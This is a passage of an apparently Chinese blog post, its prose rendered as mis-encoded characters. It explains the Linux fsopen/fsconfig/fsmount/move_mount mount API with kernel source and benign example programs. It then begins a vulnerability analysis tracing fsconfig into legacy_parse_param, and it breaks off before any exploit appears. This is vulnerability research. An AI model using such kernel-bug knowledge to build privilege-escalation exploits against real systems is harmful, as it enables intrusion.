class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å‰é¢ä¸»è¦æ“ä½œæ˜¯å¯¹å‚æ•°è¿›è¡Œå„ç§æ£€æµ‹ï¼Œç´§æ¥ç€è·å–åˆ°æ–‡ä»¶æè¿°ç¬¦ï¼Œæ¥ç€è·å–<code>fs_config</code>ï¼Œéšåæ‹·è´keyå­—æ®µåˆ°å†…æ ¸ä¸­ï¼Œæœ€ç»ˆæ ¹æ®ä¸åŒçš„cmdè¿›å…¥switch</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">		param.type = fs_value_is_string;</span><br><span class="line">		param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">			ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line">			<span class="keyword">goto</span> out_key;</span><br><span class="line">		&#125;</span><br><span class="line">		param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦å…³æ³¨è¿™ä¸€ä¸ªåˆ†æ”¯ï¼Œåœ¨åˆ†æ”¯ä¸­è®¾ç½®å®Œ<code>param</code>ä¹‹åè¿›å…¥åç»­æµç¨‹ï¼Œæœ€ç»ˆè¿›å…¥åˆ°<code>vfs_fsconfig_locked</code>å‡½æ•°è¿›è¡Œå¤„ç†ã€‚</p>
<h3 id="fsmount"><a href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h3><p>å®Œæˆäº†æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¸é…ç½®ï¼Œæ¥ä¸‹æ¥ç»ˆäºæ¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œäº†ï¼Œ<code>fsmount()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥è·å–ä¸€ä¸ªå¯ä»¥è¢«ç”¨ä»¥è¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨ä»¥ä¸‹ä¸€æ­¥çš„æŒ‚è½½</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h3><p>æœ€åä½¿ç”¨<code>move_mount</code>ç³»ç»Ÿè°ƒç”¨å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹ä¹‹é—´ç§»åŠ¨ï¼Œå¯¹äºå°šæœªè¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹è€Œè¨€ï¼Œè¿›è¡ŒæŒ‚è½½çš„æ“ä½œä¾¿æ˜¯ä»ç©ºæŒ‚è½½ç‚¹ <code>&quot;&quot;</code> ç§»åŠ¨åˆ°å¯¹åº”çš„æŒ‚è½½ç‚¹ï¼ˆä¾‹å¦‚ <code>&quot;/mnt/temp&quot;</code>ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦ç»™å‡ºç›®çš„æŒ‚è½½ç‚¹çš„ fdï¼Œè€Œå¯ä»¥ä½¿ç”¨ <code>AT_FDCWD</code>ï¼Œå¼•å…¥äº† <code>move_mount()</code> ä¹‹åï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ä¸€ä¸ªç”¨ä»¥å°† <code>&quot;/dev/sdb1&quot;</code> ä»¥ <code>&quot;ext4&quot;</code> æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° <code>&quot;/mnt/temp&quot;</code> çš„å®Œæ•´ç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_move_mount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_mount 429</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_mount</span><span class="params">(<span class="keyword">int</span> from_dfd, <span class="keyword">const</span> <span class="keyword">char</span> *from_pathname,<span class="keyword">int</span> to_dfd, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">const</span> <span class="keyword">char</span> *to_pathname, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line">    move_mount(mount_fd, <span class="string">&quot;&quot;</span>, AT_FDCWD, <span class="string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>è¿™é‡Œä»‹ç»å‡ ä¹å°±æ˜¯ç…§æŠ„a3å’ŒçŸ¥ä¹çš„æ–‡ç« </del></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å‰é¢æåˆ°åœ¨<code>fsconfig</code>å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä¼šè°ƒç”¨<code>vfs_fsconfig_locked</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vfs_fsconfig_locked</span><span class="params">(struct fs_context *fc, <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = finish_clean_context(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line">		<span class="keyword">if</span> (!mount_capable(fc))</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line">		fc-&gt;phase = FS_CONTEXT_CREATING;</span><br><span class="line">		ret = vfs_get_tree(fc);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">		ret = security_sb_kern_mount(sb);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(ret)) &#123;</span><br><span class="line">			fc_drop_locked(fc);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		up_write(&amp;sb-&gt;s_umount);</span><br><span class="line">		fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line">		fc-&gt;phase = FS_CONTEXT_RECONFIGURING;</span><br><span class="line">		sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">		<span class="keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;</span><br><span class="line">			ret = -EPERM;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		down_write(&amp;sb-&gt;s_umount);</span><br><span class="line">		ret = reconfigure_super(fc);</span><br><span class="line">		up_write(&amp;sb-&gt;s_umount);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		vfs_clean_context(fc);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;</span><br><span class="line">		    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line">			<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> vfs_parse_fs_param(fc, param);</span><br><span class="line">	&#125;</span><br><span class="line">	fc-&gt;phase = FS_CONTEXT_FAILED;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä¸Šè¿°å‡½æ•°ä¸­ä¾æ—§æ˜¯æ ¹æ®cmdè¿›å…¥ä¸åŒçš„swithåˆ†æ”¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fsconfig_command</span> &#123;</span></span><br><span class="line">	FSCONFIG_SET_FLAG	= <span class="number">0</span>,	<span class="comment">/* Set parameter, supplying no value */</span></span><br><span class="line">	FSCONFIG_SET_STRING	= <span class="number">1</span>,	<span class="comment">/* Set parameter, supplying a string value */</span></span><br><span class="line">	FSCONFIG_SET_BINARY	= <span class="number">2</span>,	<span class="comment">/* Set parameter, supplying a binary blob value */</span></span><br><span class="line">	FSCONFIG_SET_PATH	= <span class="number">3</span>,	<span class="comment">/* Set parameter, supplying an object by path */</span></span><br><span class="line">	FSCONFIG_SET_PATH_EMPTY	= <span class="number">4</span>,	<span class="comment">/* Set parameter, supplying an object by (empty) path */</span></span><br><span class="line">	FSCONFIG_SET_FD		= <span class="number">5</span>,	<span class="comment">/* Set parameter, supplying an object by fd */</span></span><br><span class="line">	FSCONFIG_CMD_CREATE	= <span class="number">6</span>,	<span class="comment">/* Invoke superblock creation */</span></span><br><span class="line">	FSCONFIG_CMD_RECONFIGURE = <span class="number">7</span>,	<span class="comment">/* Invoke superblock reconfiguration */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å®šä¹‰ï¼Œæœ€ç»ˆä¼šè¿›å…¥åˆ°<code>default</code>åˆ†æ”¯ä¸­ï¼Œæœ€ç»ˆä¼šè°ƒç”¨<code>vfs_parse_fs_param</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_parse_fs_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!param-&gt;key)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;Unnamed parameter\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ret = vfs_parse_sb_flag(fc, param-&gt;key);</span><br><span class="line">	<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = security_fs_context_parse_param(fc, param);</span><br><span class="line">	<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">		<span class="comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span></span><br><span class="line"><span class="comment">		 * don&#x27;t pass to the FS.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">		ret = fc-&gt;ops-&gt;parse_param(fc, param);</span><br><span class="line">		<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span></span><br><span class="line"><span class="comment">	 * default handling of source.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Non-string source&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Multiple sources&quot;</span>);</span><br><span class="line">		fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">		param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> invalf(fc, <span class="string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">		      fc-&gt;fs_type-&gt;name, param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_parse_fs_param);</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨æ­¤å‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°<code>fs_context-&gt;ops-&gt;parse_param</code>ï¼Œæ¥ç€æ ¹æ®å‰é¢åœ¨<code>legacy_init_fs_context</code>å‡½æ•°ä¸­ä¼šå¯¹<code>fs_context-&gt;ops</code>èµ‹å€¼ä¸º<code>legacy_fs_context_ops</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> <span class="title">legacy_fs_context_ops</span> =</span> &#123;</span><br><span class="line">	.<span class="built_in">free</span>			= legacy_fs_context_free,</span><br><span class="line">	.dup			= legacy_fs_context_dup,</span><br><span class="line">	.parse_param		= legacy_parse_param,</span><br><span class="line">	.parse_monolithic	= legacy_parse_monolithic,</span><br><span class="line">	.get_tree		= legacy_get_tree,</span><br><span class="line">	.reconfigure		= legacy_reconfigure,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å‰é¢æ‰€è¿°ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>legacy_parse_param</code>å‡½æ•°ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 